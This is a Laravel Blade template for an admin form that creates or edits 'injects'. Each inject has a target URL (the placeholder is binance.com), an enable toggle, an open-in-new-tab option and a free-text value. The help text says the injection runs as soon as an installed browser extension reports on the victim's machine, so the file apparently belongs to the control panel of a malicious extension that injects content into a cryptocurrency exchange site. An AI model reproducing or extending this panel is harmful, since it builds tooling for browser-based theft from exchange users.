@extends('pages.layout')

@section('content')
    <div class="content-wrapper">
        <div class="container-fluid flex-grow-1 container-p-y">
            <div class="row">
                <div class="col-xl">
                    <div class="card mb-4">
                        <div class="card-header d-flex justify-content-between align-items-center">
                            <h5 class="mb-0">@if(isset($item))
                                    Edit
                                @else
                                    New
                                @endif Inject</h5>
                        </div>
                        <div class="card-body">
                            <form action="{{ route('injects.create.action') }}" method="POST">
                                @if(isset($item))
                                    <input type="text" class="form-control" name="id" value="{{ $item->id }}" hidden/>
                                @endif

                                <div class="mb-3">
                                    <label class="form-label" for="url">Url</label>
                                    <input type="text" class="form-control" name="url" id="url"
                                           placeholder="binance.com"
                                           @if(isset($item)) value="{{ $item->url }}" @endif />
                                </div>
                                <div class="mb-3">
                                    <label class="form-label" for="status">Status</label>
                                    <select class="select2 form-select" name="is_enabled">
                                        <option @if(isset($item) && $item->is_enabled) selected @endif value="1">
                                            Enable
                                        </option>
                                        <option @if(isset($item) && !$item->is_enabled) selected @endif value="0">
                                            Disable
                                        </option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label" for="status">Open in new tab</label>
                                    <select class="select2 form-select" name="is_new_tab">
                                        <option @if(isset($item) && $item->is_new_tab) selected @endif value="1">
                                            Yes
                                        </option>
                                        <option @if(isset($item) && !$item->is_new_tab) selected @endif value="0">
                                            No
                                        </option>
                                    </select>
                                    <div class="form-text">Each time you install the extension and update the information about the machine, a new tab will open and the injection will immediately work.</div>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label" for="value">Value</label>
                                    <textarea
                                        id="value"
                                        name="value"
                                        class="form-control"
                                        placeholder=""
                                    >@if(isset($item))
                                            {{ $item->value }}
                                        @endif</textarea>
                                </div>
                                <button type="submit" class="btn btn-primary">@if(isset($item))
                                        Edit
                                    @else
                                        Create
                                    @endif</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection
